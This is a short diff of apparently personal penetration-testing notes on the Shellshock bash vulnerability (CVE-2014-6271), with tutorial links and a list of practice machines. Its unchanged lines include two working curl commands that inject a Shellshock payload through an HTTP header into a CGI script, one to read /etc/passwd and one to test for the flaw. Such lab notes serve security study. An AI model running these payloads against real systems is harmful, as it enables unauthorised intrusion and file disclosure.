@@ -6,7 +6,7 @@ https://blog.knapsy.com/blog/2014/10/07/basic-shellshock-exploitation/
 https://pentesterlab.com/exercises/cve-2014-6271/course
 
 
-Machines : shellshock, symfonos 2, sleepy
+Machines : shellshock, symfonos 3, sleepy
 
 $ curl -s -H "x: () { :; }; /bin/bash -c 'cat /etc/passwd'" http://192.168.110.45/cgi-bin/status
 $ curl -s -H "x: () { :; }; /bin/bash -c '; echo vulnerable'" http://192.168.110.45/cgi-bin/status
